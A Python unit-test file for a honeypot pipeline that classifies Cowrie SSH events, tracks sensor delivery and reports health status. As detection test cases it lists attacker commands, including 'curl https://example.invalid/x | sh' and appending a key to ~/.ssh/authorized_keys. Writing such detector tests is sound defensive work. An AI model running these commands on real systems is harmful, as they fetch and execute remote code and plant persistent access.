import json,sqlite3,tempfile,unittest
from pathlib import Path
from datetime import datetime,timezone
from unittest.mock import patch
from classification import classify,catalog
from cowrie_adapter import adapt
from hub import schema,accept
from collector import connect
from live_health import enrich

def command(text):
 return adapt(json.dumps({'eventid':'cowrie.command.input','timestamp':'2026-10-25T01:00:00Z','session':'x','src_ip':'8.8.8.8','input':text}),{})

class LiveMonitoring(unittest.TestCase):
 def test_heartbeat_does_not_erase_delivery(self):
  with tempfile.TemporaryDirectory() as tmp:
   state=Path(tmp)
   accept(state,'cowrie-ssh',json.dumps({'version':1,'events':[command('echo hello')]}).encode())
   db=sqlite3.connect(state/'index.sqlite')
   first=db.execute('SELECT * FROM sensor_delivery').fetchone()
   self.assertEqual(first[0],'cowrie-ssh')
   self.assertGreaterEqual(first[3],0)
   accept(state,'cowrie-ssh',json.dumps({'version':1,'events':[]}).encode())
   self.assertEqual(db.execute('SELECT * FROM sensor_delivery').fetchone(),first)
   db.close()
 def test_specific_ssh_syntax(self):
  for text,label in [('chmod +x /tmp/x','SSH executable permission change'),('chmod 755 /tmp/x','SSH executable permission change'),('cat /etc/os-release','SSH host discovery command'),('echo key >> ~/.ssh/authorized_keys','SSH key persistence indicators'),('chattr -ia .ssh','SSH file attribute change command'),('curl https://example.invalid/x | sh','SSH download piped to shell'),('crontab -l','SSH scheduled persistence indicators')]:
   result=classify(command(text))
   self.assertIn(label,[f['name'] for f in result['findings']])
   self.assertFalse(result['exploitation_confirmed'])
   self.assertIn(label,[r['name'] for r in catalog()])
 def test_benign_and_cross_protocol(self):
  labels=[f['name'] for f in classify(command('echo hello /wp-admin'))['findings']]
  self.assertEqual(labels,['SSH command observed'])
  e=command('chmod +x /x');e['method']='cowrie.login.success'
  self.assertNotIn('SSH executable permission change',[f['name'] for f in classify(e)['findings']])
  e={'path':'/help.php','method':'GET','service':'portal','analysis':{'hits':[]}}
  self.assertEqual(classify(e)['groups'],['Navigation'])
 def test_health_unknown_and_delivery_preserved(self):
  with tempfile.TemporaryDirectory() as tmp:
   state=Path(tmp);db=connect(state);schema(db)
   # Existing table allows publisher startup before the first measured delivery.
   db.execute('INSERT INTO events VALUES (?,?,?,?,?,?)',('id','2026-10-25T01:00:00+00:00','8.8.8.8','cowrie','info','{}'))
   db.execute('INSERT INTO event_sources VALUES (?,?)',('id','cowrie-ssh'))
   db.execute('INSERT INTO sensor_delivery VALUES (?,?,?,?)',('cowrie-ssh','2026-10-25T01:01:00+00:00','2026-10-25T01:00:00+00:00',60))
   sensors=[{'id':'cowrie-ssh'}]
   with patch('live_health.Path.read_text',side_effect=FileNotFoundError):
    result=enrich(db,sensors,state,datetime(2026,10,25,1,2,tzinfo=timezone.utc))
   self.assertEqual(result['backup']['status'],'unknown')
   self.assertEqual(sensors[0]['delivery']['lag_seconds'],60)
   self.assertIsNone(result['growth_since_previous_day_bytes'])
   db.close()

if __name__=='__main__':unittest.main()
